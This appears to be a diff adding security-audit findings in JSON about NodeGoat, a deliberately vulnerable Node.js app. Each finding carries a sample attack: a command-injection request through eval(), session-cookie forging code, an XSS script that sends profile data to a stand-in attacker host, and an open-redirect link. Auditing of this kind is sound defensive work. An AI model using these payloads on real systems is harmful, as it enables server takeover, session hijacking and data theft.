@@ -1,0 +1,62 @@
+[
+  {
+    "finding_id": "c67c48d5-f18e-5429-a9e4-4e7a0a9fb8e9",
+    "session_id": "ChBhOTRhZjYwMjMxMDc5NzQ0EAgaATAqBG1haW4",
+    "title": "Remote Code Execution via Insecure eval() in Contributions Handler",
+    "file_path": "/home/jfplante_google_com/repos/o03-nodegoat_rep1/app/routes/contributions.js",
+    "severity": "CRITICAL",
+    "confidence": 100,
+    "analysis": "In `app/routes/contributions.js`, the `handleContributionsUpdate` route handler processes HTTP POST requests to `/contributions`. User-supplied parameters from `req.body.preTax`, `req.body.afterTax`, and `req.body.roth` are directly passed into JavaScript's `eval()` function without any prior validation, sanitization, or type checking:\n\n- **Source**: `req.body.preTax`, `req.body.afterTax`, and `req.body.roth` received from the HTTP POST request body.\n- **Sanitization/Validation**: None. The values are directly evaluated with `eval()` before numerical or range validation is performed.\n- **Sink**: `eval(...)` at lines 32-34.\n\nThis results in Server-Side JavaScript Code Injection (Remote Code Execution), enabling an authenticated attacker to execute arbitrary Node.js code and system commands on the server.\n\n### Conceptual Exploit Payload:\nSend the following HTTP request with an authenticated session cookie:\n\n```http\nPOST /contributions HTTP/1.1\nHost: target.example.com\nContent-Type: application/x-www-form-urlencoded\nCookie: connect.sid=\u003csession_cookie\u003e\n\npreTax=2%3Brequire('child_process').execSync('id')%3B\u0026afterTax=0\u0026roth=0\n```\nWhen `eval(req.body.preTax)` executes, it evaluates `2;require('child_process').execSync('id');`, executing the system command `id` on the host server.",
+    "snippet": "        const preTax = eval(req.body.preTax);\n        const afterTax = eval(req.body.afterTax);\n        const roth = eval(req.body.roth);",
+    "vuln_type": "CWE-94: Improper Control of Generation of Code ('Code Injection')",
+    "vuln_id": "CWE-94",
+    "status": "OPEN",
+    "start_line": 32,
+    "end_line": 34
+  },
+  {
+    "finding_id": "f51c5732-c2cb-565f-8253-60d231d34474",
+    "session_id": "ChA5ZDU4NmNkYTk0MTNlNzE4EAgaATAqBG1haW4",
+    "title": "Hardcoded Session Cookie Secret in Application Configuration",
+    "file_path": "/home/jfplante_google_com/repos/o03-nodegoat_rep1/config/env/all.js",
+    "severity": "HIGH",
+    "confidence": 95,
+    "analysis": "The application uses a hardcoded secret string literal `cookieSecret: \"session_cookie_secret_key_here\"` in `config/env/all.js`. This configuration is merged and loaded in `server.js` and supplied to the Express session middleware (`app.use(session({ secret: cookieSecret, ... }))`) across all environments (including production, where `config/env/production.js` does not override it).\n\nBecause the session secret key is hardcoded and publicly known from source code:\n- Source: Untrusted HTTP client requests carrying session cookies.\n- Validation: The server validates the session cookie's HMAC signature using the hardcoded secret `cookieSecret`.\n- Sink: `express-session` verification and signing logic using `cookieSecret`.\n\nConceptual Exploit Payload:\nAn attacker can forge or tamper with session cookies by calculating the HMAC-SHA256 signature using the known key `\"session_cookie_secret_key_here\"`, for example:\n```javascript\nconst crypto = require(\"crypto\");\nconst sessionId = \"target_session_id_or_arbitrary_id\";\nconst signature = crypto.createHmac(\"sha256\", \"session_cookie_secret_key_here\").update(sessionId).digest(\"base64\").replace(/=+$/, \"\");\nconst cookieHeader = `connect.sid=s%3A${sessionId}.${signature}`;\n```\nSending an HTTP request with `Cookie: connect.sid=s:...` allows the attacker to present validly signed session cookies to the server.",
+    "snippet": "    cookieSecret: \"session_cookie_secret_key_here\",",
+    "vuln_type": "CWE-798: Use of Hard-coded Credentials",
+    "vuln_id": "CWE-798",
+    "status": "OPEN",
+    "start_line": 8,
+    "end_line": 8
+  },
+  {
+    "finding_id": "2f1c84b4-270d-5c52-a5f1-f92bf3f40917",
+    "session_id": "ChAxMDU5MzkxNGZhY2VmMWFmEAgaATAqBG1haW4",
+    "title": "Reflected Cross-Site Scripting (XSS) via `res.write(body)` in `/research`",
+    "file_path": "/home/jfplante_google_com/repos/o03-nodegoat_rep1/app/routes/research.js",
+    "severity": "HIGH",
+    "confidence": 100,
+    "analysis": "- **Source**: Untrusted user input enters via query parameters `req.query.url` and `req.query.symbol` in the `/research` route (`ResearchHandler.displayResearch`).\n- **Data Flow**: The attacker-controlled URL is constructed via concatenation (`req.query.url + req.query.symbol`) and passed to `needle.get()`. The HTTP response header is set to `Content-Type: text/html`. The response body returned by the HTTP GET request is stored in `body`.\n- **Sanitization/Validation**: No validation is performed on the URL, and no HTML escaping or sanitization is performed on `body`.\n- **Sink**: `res.write(body)` at line 25 writes the unescaped content directly to the HTTP response body served with `text/html` Content-Type.\n- **Reachability**: An attacker can provide a link to an authenticated user pointing to `GET /research?url=http://attacker.com/xss.html?\u0026symbol=test`. The server fetches the attacker's page and renders its HTML/JavaScript directly into the victim's session, executing arbitrary script in the context of the user's browser session.\n\n**Conceptual Exploit Payload**:\nAttacker sets up `http://attacker.com/payload.html` returning:\n```html\n\u003cscript\u003efetch('/profile').then(r=\u003er.text()).then(d=\u003efetch('http://attacker.com/steal?data='+encodeURIComponent(d)))\u003c/script\u003e\n```\nVictim accesses:\n```http\nGET /research?url=http://attacker.com/payload.html?\u0026symbol=foo HTTP/1.1\nHost: target.example.com\nCookie: \u003csession_cookie\u003e\n```\nThe server responds with:\n```http\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n\u003ch1\u003eThe following is the stock information you requested.\u003c/h1\u003e\n\n\n\u003cscript\u003efetch('/profile').then(r=\u003er.text()).then(d=\u003efetch('http://attacker.com/steal?data='+encodeURIComponent(d)))\u003c/script\u003e\n```",
+    "snippet": "                    res.write(body);",
+    "vuln_type": "Cross-Site Scripting (XSS)",
+    "vuln_id": "CWE-79",
+    "status": "OPEN",
+    "start_line": 25,
+    "end_line": 25
+  },
+  {
+    "finding_id": "0e66b9c0-857c-561a-94d9-e6f2b6c117fa",
+    "session_id": "ChAxMDU5MzkxNGZhY2VmMWFmEAgaATAqBG1haW4",
+    "title": "Open Redirect via Unvalidated `url` Parameter in `/learn`",
+    "file_path": "/home/jfplante_google_com/repos/o03-nodegoat_rep1/app/routes/index.js",
+    "severity": "MEDIUM",
+    "confidence": 100,
+    "analysis": "- **Source**: Untrusted user input enters via the `url` query parameter (`req.query.url`) in the `GET /learn` route handler.\n- **Sanitization/Validation**: There is no validation, allowlist check, or sanitization performed on `req.query.url`.\n- **Sink**: The parameter is passed directly to Express's `res.redirect(req.query.url)` at line 72.\n- **Reachability**: The endpoint `/learn` is accessible to any authenticated user. An attacker can craft a phishing link directing the user to the trusted application domain, which automatically redirects the user's browser to an arbitrary external malicious website.\n\n**Conceptual Exploit Payload**:\n```http\nGET /learn?url=https://attacker.com/phishing HTTP/1.1\nHost: target.example.com\nCookie: \u003cvalid_session_cookie\u003e\n```\nResponse:\n```http\nHTTP/1.1 302 Found\nLocation: https://attacker.com/phishing\n```",
+    "snippet": "        return res.redirect(req.query.url);",
+    "vuln_type": "Open Redirect",
+    "vuln_id": "CWE-601",
+    "status": "OPEN",
+    "start_line": 72,
+    "end_line": 72
+  }
+]
